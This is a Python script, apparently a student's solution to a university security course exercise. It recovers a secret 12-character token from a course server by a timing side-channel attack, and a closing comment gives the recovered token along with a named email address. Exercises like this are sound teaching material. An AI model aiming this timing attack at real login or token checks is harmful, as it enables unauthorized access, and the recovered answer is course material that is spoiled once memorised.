import requests as req
import numpy as np

email = 'gregoire.clement@epfl.ch'

chars = [chr(ord('a')+i) for i in range(6)]
chars.extend(str(i) for i in range(10))

url = 'http://com402.epfl.ch/hw5/ex2'
duration_hist = {}
messages = {'My life is a perfect graveyard of buried hopes'}

def generate_token(start_string='', length=12):
    n = length - len(start_string)
    return start_string + '#' * n

def payload(token):
    return{'email': email, 'token':  token}

def time_request(token):
    pload = payload(token)
    resp = req.post(url, json=pload)
    duration = resp.elapsed.total_seconds()
    m = resp.content.decode()
    if resp.status_code is 200:
        print(f'\rex2 = "{m}"', sep='', end='')
    else:
        if m not in messages:
            messages.add(m)
            print(f'\rnew message: "{m}"', sep='', end='')
    if token not in duration_hist:
        duration_hist[token] = []
    duration_hist[token].append(duration)
    return duration

chars_found = ''
chars_list = chars.copy()

for _ in range(12):
    # warmup
    warmup_durations = []
    for _ in range(5):
        next_guess = chars_found
        token = generate_token(next_guess)
        duration = time_request(token)
        warmup_durations.append(duration)
    warmup_median = np.median(warmup_durations)
    
    c_durations = {c:[] for c in chars_list}
    np.random.shuffle(chars_list)
    for c in chars_list:
        next_guess = chars_found + c
        token = generate_token(next_guess)
        duration = time_request(token)
        c_durations[c].append(duration)
    c_median = np.median(np.array(list(c_durations.values())).flatten())

    c_above = [c for c,ls in c_durations.items() if ls[0] > c_median + 0.3]
    
    while len(c_above) > 1:
        np.random.shuffle(c_above)
        for c in c_above:
            next_guess = chars_found + c
            token = generate_token(next_guess)
            duration = time_request(token)
            c_durations[c].append(duration)
        c_above = [c for c,ls in c_durations.items() if np.median(ls) > c_median + 0.3]
    

    chars_found = chars_found + c_above[0]
    print(f'\r{generate_token(chars_found)}', sep='', end='')


# solution can be obtained directly using this:
# time_request('2c0999e9cf0f')
